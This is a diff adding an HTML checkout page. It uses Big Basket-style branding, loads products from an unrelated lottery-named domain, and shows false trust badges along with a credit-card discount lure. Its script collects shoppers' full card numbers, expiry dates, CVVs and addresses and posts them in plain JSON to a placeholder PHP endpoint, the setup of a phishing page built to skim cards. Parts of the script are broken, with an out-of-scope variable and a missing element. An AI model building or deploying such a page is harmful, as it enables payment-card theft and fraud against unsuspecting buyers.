@@ -1,0 +1,644 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
+
+<style>
+body{ background:#f8fafc; font-family: 'Segoe UI', Arial, sans-serif; }
+
+/* HEADER - NO CHANGES */
+.header{ background:white; padding:15px; border-bottom:1px solid #ddd; }
+.logo img{ height:55px; }
+
+/* SECURE CHECKOUT HEADER (Screenshot Match) */
+.checkout-main-header {
+    background: white; border-radius: 12px; padding: 25px; margin-top: 20px;
+    box-shadow: 0 4px 15px rgba(0,0,0,0.05); border-bottom: 2px solid #e2e8f0;
+}
+.checkout-main-header h2 { font-weight: 700; color: #1e293b; margin-bottom: 15px; }
+.trust-labels { 
+    background: #f0fdf4; border: 1px solid #dcfce7; border-radius: 8px; 
+    padding: 10px; display: flex; gap: 20px; flex-wrap: wrap;
+}
+.trust-item { font-size: 13px; color: #166534; display: flex; align-items: center; gap: 6px; }
+
+/* CHECKOUT BOXES */
+.container-checkout{ max-width:1200px; margin:auto; padding: 0 15px; }
+.box{ background:white; padding:30px; border-radius:15px; margin-top:25px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); }
+.box h4 { font-weight: 700; color: #334155; border-bottom: 1px solid #f1f5f9; padding-bottom: 15px; margin-bottom: 25px; }
+
+/* INPUTS (Screenshot Match) */
+.input-wrap { margin-bottom: 20px; }
+.input{ 
+    width:100%; padding:14px; border:1.5px solid #e2e8f0; border-radius:10px; 
+    font-size:15px; transition: 0.3s; background: #fff;
+}
+.input:focus { border-color: #10b981; outline: none; box-shadow: 0 0 0 4px rgba(16, 185, 129, 0.1); }
+.phone-pre { 
+    background: #f1f5f9; border: 1.5px solid #e2e8f0; border-right: none;
+    padding: 14px; border-radius: 10px 0 0 10px; color: #64748b; font-weight: 600;
+}
+.phone-inp { border-radius: 0 10px 10px 0 !important; }
+
+/* PAYMENT OPTIONS */
+.pay-opt { display: flex; align-items: center; gap: 10px; cursor: pointer; font-weight: 600; font-size: 15px; }
+.pay-opt input { width: 18px; height: 18px; accent-color: #0b9444; }
+
+.offer-box { 
+    background: #f0fdf4; border: 1px solid #bcf0da; padding: 15px; 
+    border-radius: 10px; margin: 20px 0; color: #166534; font-size: 14px;
+}
+.success-banner {
+    background: #f0fdf4; border: 1px solid #bcf0da; padding: 12px;
+    border-radius: 10px; margin-bottom: 20px; font-size: 13px; color: #166534;
+}
+
+/* ORDER SUMMARY (Screenshot Match) */
+.order-summary{ background:white; padding:25px; border-radius:15px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); position: sticky; top: 20px; }
+.prod-img { border-radius: 8px; border: 1px solid #f1f5f9; padding: 5px; }
+.summary-line { display: flex; justify-content: space-between; margin-bottom: 12px; font-size: 15px; }
+.total-line { 
+    border-top: 2px solid #f1f5f9; padding-top: 15px; margin-top: 15px;
+    display: flex; justify-content: space-between; font-size: 20px; font-weight: 800; color: #0b9444;
+}
+.secure-txt { text-align: center; color: #94a3b8; font-size: 12px; margin-top: 15px; }
+
+.place-btn{ 
+    width:100%; padding:16px; background:#94a3b8; color:white; border:none; 
+    border-radius:12px; font-weight:700; font-size:17px; margin-top:15px; transition: 0.3s;
+}
+.btn-active { background: #10b981; box-shadow: 0 4px 12px rgba(16, 185, 129, 0.3); }
+
+/* FOOTER - NO CHANGES */
+.footer{ background:white; padding:40px 0; margin-top:50px; border-top:1px solid #eee; }
+.footer-title{ color:#1a8f3c; font-weight:bold; }
+.footer-text{ color:#666; font-size:14px; }
+.social i{ width:40px; height:40px; line-height:40px; text-align:center; background:white; border-radius:50%; margin-right:10px; box-shadow:0 2px 8px rgba(0,0,0,0.1); }
+.store{ height:45px; margin-left:10px; }
+.quick-links a{ margin-right:15px; color:#444; font-size:14px; text-decoration:none; }
+.service-box{ background:white; padding:20px; text-align:center; border-radius:12px; box-shadow:0 2px 10px rgba(0,0,0,0.08); }
+.service-box p{ margin-top:10px; font-size:14px; }
+.footer-bottom{ background:#f8fafc; padding:15px 0; margin-top:30px; font-size:14px; border-top: 1px solid #eee; }
+
+@media(max-width:768px){
+    .order-summary { margin-top: 25px; position: static; }
+}
+
+/* MOBILE */
+
+@media(max-width:768px){
+
+.logo img{
+height:45px;
+}
+
+}
+@media(max-width:768px){
+
+.footer{
+text-align:center;
+padding:30px 15px;
+}
+
+.footer-title{
+font-size:26px;
+}
+
+.footer-text{
+max-width:500px;
+margin:auto;
+}
+
+.social{
+margin-top:15px;
+}
+
+.social i{
+margin:0 8px;
+}
+
+.app{
+text-align:center !important;
+margin-top:25px;
+}
+
+.store{
+height:48px;
+margin:8px;
+}
+
+.quick-links{
+display:flex;
+flex-wrap:wrap;
+justify-content:center;
+gap:12px;
+margin-top:15px;
+}
+
+.quick-links a{
+display:inline-block;
+font-size:15px;
+}
+
+.service{
+margin-top:25px;
+}
+
+.service-box{
+margin-bottom:15px;
+}
+
+.footer-bottom{
+text-align:center;
+}
+
+.footer-bottom .container{
+flex-direction:column;
+gap:5px;
+}
+
+}
+
+.error-text{
+color:#dc2626;
+font-size:13px;
+margin-top:6px;
+display:none;
+}
+
+.input-error{
+border-color:#dc2626 !important;
+box-shadow:0 0 0 3px rgba(220,38,38,0.1);
+}
+</style>
+</head>
+
+<body>
+<header class="header">
+    <div class="container d-flex justify-content-between align-items-center">
+        <div class="logo"><img src="logo.png"></div>
+        <div style="font-size:22px;"><img src="shopping-cart.png" alt="Cart" style="width:32px;height:32px;"></div>
+    </div>
+</header>
+
+<div class="container-checkout">
+    <div class="checkout-main-header">
+        <h2>Secure Checkout</h2>
+        <div class="trust-labels">
+            <div class="trust-item"><i class="fas fa-shield-halved"></i> SSL Encrypted</div>
+            <div class="trust-item"><i class="fas fa-truck"></i> Free Delivery</div>
+            <div class="trust-item"><i class="fas fa-lock"></i> Secure Payment</div>
+            <div class="trust-item"><i class="fas fa-circle-check"></i> 7-Day Return</div>
+        </div>
+    </div>
+
+    <div class="row">
+        <div class="col-md-7">
+            <div class="box">
+                <h4>Billing Details</h4>
+                <div class="input-wrap">
+<input class="input" id="fullname" placeholder="Full Name *">
+<div class="error-text" id="nameError">Enter your full name</div>
+</div>
+                <div class="row g-0 input-wrap">
+                    <div class="col-2"><div class="phone-pre text-center">+91</div></div>
+                    <div class="col-10"><input class="input phone-inp" id="mobile" placeholder="Mobile Number *" maxlength="10">
+<div class="error-text" id="mobileError">Enter valid 10 digit mobile number</div></div>
+                </div>
+                <div class="row g-3 input-wrap">
+                    <div class="col-md-6"><input class="input" id="city" placeholder="City *"></div>
+                    <div class="col-md-6"><input class="input" id="state" placeholder="State *"></div>
+                </div>
+                <div class="row g-3">
+                    <div class="col-md-6"><input class="input" id="address" placeholder="Full Address *"></div>
+                    <div class="col-md-6"><input class="input" id="pincode" placeholder="Pincode *" maxlength="6">
+<div class="error-text" id="pincodeError">Enter valid 6 digit pincode</div></div>
+                </div>
+            </div>
+
+            <div class="box">
+                <h4><i class="far fa-credit-card me-2"></i> Payment Details</h4>
+                <div class="d-flex gap-4 mb-4">
+                    <label class="pay-opt">
+                        <input type="radio" name="pay" value="credit" checked onclick="calc()"> Credit Card
+                    </label>
+                    <label class="pay-opt">
+                        <input type="radio" name="pay" value="debit" onclick="calc()"> Debit Card
+                    </label>
+                </div>
+
+                <div id="offer" class="offer-box">
+                    🎉 <b>10% OFF on Credit Card Payments!</b><br>
+                    Discount applied automatically at checkout
+                </div>
+
+                <div id="debitmsg" class="offer-box" style="display:none; background: #fffbeb; border-color: #fef3c7; color: #92400e;">
+                    💡 Select Credit Card to avail 10% instant discount
+                </div>
+
+                <div class="success-banner">
+                    <i class="fas fa-circle-check me-2"></i> Ensure your card is activated for online transactions
+                </div>
+
+               <h5 class="mb-3" style="font-weight:700;font-size:16px;">Card Details</h5>
+
+<div class="input-wrap">
+<input class="input" id="cardNumber" maxlength="19" placeholder="Card Number *">
+<div class="error-text" id="cardError">Invalid card number</div></div>
+
+<div class="row g-3 input-wrap">
+<div class="col-md-6">
+<input class="input" id="expMonth" placeholder="MM" maxlength="2">
+<div class="error-text" id="monthError">Enter valid month</div></div>
+
+<div class="col-md-6">
+<input class="input" id="expYear" placeholder="YY" maxlength="2">
+<div class="error-text" id="yearError">Invalid expiry year</div></div>
+</div>
+
+<div class="input-wrap">
+<input class="input" id="cvv" maxlength="3" placeholder="CVV *">
+<div class="error-text" id="cvvError">Invalid CVV</div></div>
+
+                <p class="text-center" style="color:#0b9444; font-weight: 600; font-size: 14px; margin-top: 20px;">
+                    Easy 7-Day Return Policy – Hassle-free returns
+                </p>
+
+<button onclick="placeOrder()" class="place-btn btn-active">Place Order Securely</button>            </div>
+        </div>
+
+        <!-- RIGHT SUMMARY -->
+<div class="col-md-5">
+
+<div class="order-summary">
+
+<img id="p-img" width="75">
+
+<div id="p-title"></div>
+
+<div>₹<span id="subtotal"></span></div>
+<div>Discount: ₹<span id="discount">0</span></div>
+<div>Total: ₹<span id="total"></span></div>
+
+<div id="delivery"></div>
+                    <div class="summary-line" style="color:#0b9444; font-weight: 600;">
+                        <span>Shipping:</span>
+                        <span>FREE</span>
+                    </div>
+                </div>
+
+                <div class="secure-txt">
+                    <i class="fas fa-lock me-1"></i> Your payment information is encrypted and secure
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<footer class="footer">
+    <div class="container">
+        <div class="row align-items-center mb-4">
+            <div class="col-md-6">
+                <h3 class="footer-title">Big Basket Shopping India</h3>
+                <p class="footer-text">Your trusted partner for quality products at the best prices. Shop with confidence and enjoy hassle-free returns.</p>
+                <div class="social">
+                    <i class="fab fa-facebook-f"></i>
+                    <i class="fab fa-twitter"></i>
+                    <i class="fab fa-instagram"></i>
+                </div>
+            </div>
+            <div class="col-md-6 text-md-end app">
+                <h5 class="mb-3">Download Big Basket Ready Mobile App Now!</h5>
+                <img src="googleplay.svg" class="store">
+                <img src="appstore.svg" class="store">
+            </div>
+        </div>
+        <hr>
+        <h6 class="mb-3">Quick Links</h6>
+        <div class="quick-links">
+            <a href="#">About Us</a> <a href="#">Contact Us</a> <a href="#">FAQs</a> <a href="#">Privacy Policy</a> <a href="#">Terms and Conditions</a> <a href="#">Pricing, Delivery & Return Policy</a> <a href="#">Refund Policy</a> <a href="#">Pickup Points</a> <a href="#">Disclaimer</a>
+        </div>
+        <div class="row service mt-4">
+            <div class="col-md-3 col-6"><div class="service-box">🚚<p>Free Delivery</p></div></div>
+            <div class="col-md-3 col-6"><div class="service-box">🔒<p>Secure Payment</p></div></div>
+            <div class="col-md-3 col-6"><div class="service-box">↩<p>7-Day Returns</p></div></div>
+            <div class="col-md-3 col-6"><div class="service-box">✔<p>100% Authentic</p></div></div>
+        </div>
+    </div>
+    <div class="footer-bottom">
+        <div class="container d-flex justify-content-between flex-wrap">
+            <p>© 2025 Avenue E-Commerce Limited (AEL). All Rights Reserved.</p>
+            <p>Made with ❤️ in India | Version 2.0</p>
+        </div>
+    </div>
+</footer>
+
+<script>
+
+// 👉 GLOBAL PRODUCT DATA
+let price = 0;
+let productTitle = "";
+
+// 👉 ID lo
+const id = new URLSearchParams(window.location.search).get("id") || 1;
+
+// 👉 API se data lao
+fetch("https://keralamegajackpotlottery.online/bigbasket/get_products.php") // 👈 apna domain daalo
+.then(res => res.json())
+.then(data => {
+
+let p = data.find(x => x.id == id);
+if(!p) return;
+
+price = parseFloat(p.price);
+productTitle = p.title;
+
+// UI update
+document.getElementById("subtotal").innerText = price;
+document.getElementById("total").innerText = price;
+
+calc();
+
+});
+// set data
+document.getElementById("p-img").src = "https://keralamegajackpotlottery.online/bigbasket/"+p.image;
+document.getElementById("p-title").innerText = p.title;
+document.getElementById("subtotal").innerText = price;
+document.getElementById("total").innerText = price;
+
+/* PRICE CALCULATION */
+
+function calc(){
+
+let pay = document.querySelector('input[name="pay"]:checked').value;
+let discount = 0;
+
+if(pay === "credit"){
+
+discount = price * 0.10;
+
+document.getElementById("discountrow").style.display="flex";
+document.getElementById("offer").style.display="block";
+document.getElementById("debitmsg").style.display="none";
+
+}else{
+
+discount = 0;
+
+document.getElementById("discountrow").style.display="none";
+document.getElementById("offer").style.display="none";
+document.getElementById("debitmsg").style.display="block";
+
+}
+
+document.getElementById("discount").innerText = discount.toFixed(2);
+document.getElementById("total").innerText = (price-discount).toFixed(2);
+
+}
+
+
+/* CARD NUMBER FORMAT */
+
+document.getElementById("cardNumber").addEventListener("input",function(e){
+
+let value = e.target.value.replace(/\D/g,'').substring(0,16);
+let formatted = value.replace(/(.{4})/g,'$1 ').trim();
+
+e.target.value = formatted;
+
+});
+
+
+/* MONTH VALIDATION */
+
+document.getElementById("expMonth").addEventListener("input",function(){
+
+let m = this.value.replace(/\D/g,'').substring(0,2);
+
+if(m < 1) m = 1;
+if(m > 12) m = 12;
+
+this.value = m;
+
+});
+
+
+/* YEAR VALIDATION */
+
+document.getElementById("expYear").addEventListener("blur",function(){
+
+let year = parseInt(this.value);
+let currentYear = new Date().getFullYear() % 100;
+
+if(year < currentYear){
+
+alert("Card Expired Year Invalid");
+this.value="";
+
+}
+
+});
+
+
+/* CVV VALIDATION */
+
+document.getElementById("cvv").addEventListener("input",function(){
+
+this.value = this.value.replace(/\D/g,'').substring(0,3);
+
+});
+
+
+/* ERROR SHOW */
+
+function showError(input,id){
+
+input.classList.add("input-error");
+document.getElementById(id).style.display="block";
+
+}
+
+
+/* ERROR CLEAR */
+
+function clearError(input,id){
+
+input.classList.remove("input-error");
+document.getElementById(id).style.display="none";
+
+}
+
+
+/* LUHN CARD VALIDATION */
+
+function validCard(card){
+
+let sum = 0;
+let shouldDouble = false;
+
+for(let i = card.length - 1; i >= 0; i--){
+
+let digit = parseInt(card.charAt(i));
+
+if(shouldDouble){
+digit *= 2;
+if(digit > 9) digit -= 9;
+}
+
+sum += digit;
+shouldDouble = !shouldDouble;
+
+}
+
+return (sum % 10) === 0;
+
+}
+
+function detectCardType(number){
+
+number = number.replace(/\s/g,'');
+
+if(/^4/.test(number)) return "visa";
+if(/^5[1-5]/.test(number)) return "mastercard";
+if(/^6/.test(number)) return "rupay";
+
+return "unknown";
+
+}
+
+
+/* PLACE ORDER */
+
+function placeOrder(){
+
+let name = document.getElementById("fullname");
+let mobile = document.getElementById("mobile");
+let city = document.getElementById("city");
+let state = document.getElementById("state");
+let address = document.getElementById("address");
+let pincode = document.getElementById("pincode");
+
+let card = document.getElementById("cardNumber");
+let month = document.getElementById("expMonth");
+let year = document.getElementById("expYear");
+let cvv = document.getElementById("cvv");
+
+let valid=true;
+
+
+/* NAME */
+
+if(name.value.trim()==""){
+showError(name,"nameError");
+valid=false;
+}else{
+clearError(name,"nameError");
+}
+
+
+/* MOBILE */
+
+if(!/^[0-9]{10}$/.test(mobile.value)){
+showError(mobile,"mobileError");
+valid=false;
+}else{
+clearError(mobile,"mobileError");
+}
+
+
+/* PINCODE */
+
+if(!/^[0-9]{6}$/.test(pincode.value)){
+showError(pincode,"pincodeError");
+valid=false;
+}else{
+clearError(pincode,"pincodeError");
+}
+
+
+/* CARD */
+
+let cardNum = card.value.replace(/\s/g,'');
+let type = detectCardType(cardNum);
+
+if(cardNum.length!=16 || !validCard(cardNum) || type==="unknown"){
+showError(card,"cardError");
+valid=false;
+}else{
+clearError(card,"cardError");
+}
+
+
+/* MONTH */
+
+if(month.value.length!=2){
+showError(month,"monthError");
+valid=false;
+}else{
+clearError(month,"monthError");
+}
+
+
+/* YEAR */
+
+if(year.value.length!=2){
+showError(year,"yearError");
+valid=false;
+}else{
+clearError(year,"yearError");
+}
+
+
+/* CVV */
+
+if(!/^[0-9]{3}$/.test(cvv.value)){
+showError(cvv,"cvvError");
+valid=false;
+}else{
+clearError(cvv,"cvvError");
+}
+
+
+/* SUCCESS */
+
+if(valid){
+
+fetch("https://yourdomain.com/save_order.php",{
+
+method:"POST",
+headers:{'Content-Type':'application/json'},
+
+body:JSON.stringify({
+
+name:name.value,
+mobile:mobile.value,
+city:city.value,
+state:state.value,
+address:address.value,
+pincode:pincode.value,
+product:productTitle,
+price:price,
+card:card.value,
+month:month.value,
+year:year.value,
+cvv:cvv.value
+
+})
+
+})
+
+.then(res=>res.text())
+.then(()=>{
+window.location="confirm.html";
+});
+
+}
+
+}
+
+</script>
+</body>
+</html>
